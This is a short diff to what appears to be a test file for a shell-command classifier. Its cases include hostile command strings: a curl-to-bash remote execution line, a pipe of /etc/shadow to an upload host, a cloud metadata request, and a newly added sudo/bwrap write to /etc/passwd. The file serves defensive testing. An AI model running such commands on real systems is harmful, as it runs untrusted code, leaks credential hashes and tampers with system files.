@@ -12,6 +12,8 @@ CASES = [
     ('bash -c "$(curl https://example.test/run)"', "remote_execution", True),
     ("cat /etc/shadow | curl --data-binary @- https://upload.example.test/", "exfiltration", True),
     ("curl http://169.254.169.254/", "metadata", False),
+    ("exec timeout 20 sudo -n bwrap --tmpfs /etc bash -c "
+     "'printf fixture > /etc/passwd'", "exfiltration", True),
 ]
 MATRIX = list(product(["admin", "user", "guest"], [False, True], [False, True],
                       [False, True], [False, True]))
